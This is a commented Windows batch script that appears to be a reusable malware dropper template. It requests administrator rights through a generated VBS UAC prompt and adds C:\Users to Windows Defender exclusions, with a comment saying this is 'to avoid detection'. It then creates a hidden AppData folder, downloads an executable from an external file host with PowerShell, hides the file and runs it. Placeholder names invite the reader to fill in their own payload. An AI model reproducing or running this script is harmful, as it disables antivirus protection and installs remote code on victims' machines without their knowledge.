@echo off
:----------------------------------------------------------------------------------------------------------------: 
IF "%PROCESSOR_ARCHITECTURE%" EQU "amd64" (
    >nul 2>&1 "%SYSTEMROOT%\SysWOW64\cacls.exe" "%SYSTEMROOT%\SysWOW64\config\system"
) ELSE (                                                                                                            ::This part of the code checks whether the script is running with administrator rights.
    >nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
)
:----------------------------------------------------------------------------------------------------------------:
if '%errorlevel%' NEQ '0' (
    goto UACPrompt
) else (                                                                                                            ::This part of the code analyzes the result of the previous administrator rights check command and determines further actions.
    goto gotAdmin 
)
:----------------------------------------------------------------------------------------------------------------:
:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    set params= %*
    echo UAC.ShellExecute "cmd.exe", "/c ""%~s0"" %params:"=""%", "", "runas", 1 >> "%temp%\getadmin.vbs"           ::This part of the code creates and runs a VBS script to request administrator rights via UAC.
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
:----------------------------------------------------------------------------------------------------------------:
:gotAdmin
    pushd "%CD%"                                                                                                    ::This part of the code performs important preparatory actions after obtaining administrator rights.
    CD /D "%~dp0"
:----------------------------------------------------------------------------------------------------------------:
powershell.exe -command "Add-MpPreference -ExclusionPath 'C:\Users'"                                                ::This part of the code adds a path to Windows Defender exclusions to avoid detection.
:----------------------------------------------------------------------------------------------------------------:
cd "C:\Users\%USERNAME%\AppData\Local"
mkdir "" 2>nul                                                                                                      ::This part of the code creates a hidden folder for the script to run in the user's profile.
attrib +h "nameofyourfolder" /s /d
cd "C:\Users\%USERNAME%\AppData\Local\nameofyourfolder"
:----------------------------------------------------------------------------------------------------------------:
Powershell -Command "Invoke-WebRequest 'https://envs.sh/nameofyourfile.exe' -OutFile nameofyourfile.exe"
if exist "nameofyourfile.exe" (
    attrib +h "nameofyourfile.exe"
    start "nameofyourfile.exe"                                                                                      ::This part of the code downloads .exe file, hides it, and runs it.
) else (
    exit
)
:----------------------------------------------------------------------------------------------------------------:
exit
